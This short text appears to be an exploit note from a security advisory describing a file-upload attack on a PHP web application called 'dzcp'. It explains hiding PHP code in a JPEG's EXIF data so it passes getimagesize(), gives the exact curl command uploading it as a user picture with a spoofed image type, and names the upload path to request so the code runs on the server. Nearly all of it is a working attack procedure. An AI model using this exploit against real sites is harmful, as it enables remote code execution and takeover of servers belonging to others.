Get a JPEG file, open it in a hex editor, add some PHP inside the EXIF 
data or
in similar places.  Make sure PHP's getimagesize() does not return false 
and
that the file does not throw parse errors or the like when fed to PHP.  
Then:

curl -F 'file=@img.php;type=image/jpeg' 
'http://<dzcp>/upload/index.php?action=userpic&do=upload'

Then check http://<dzcp>/inc/images/uploads/userpics/.php
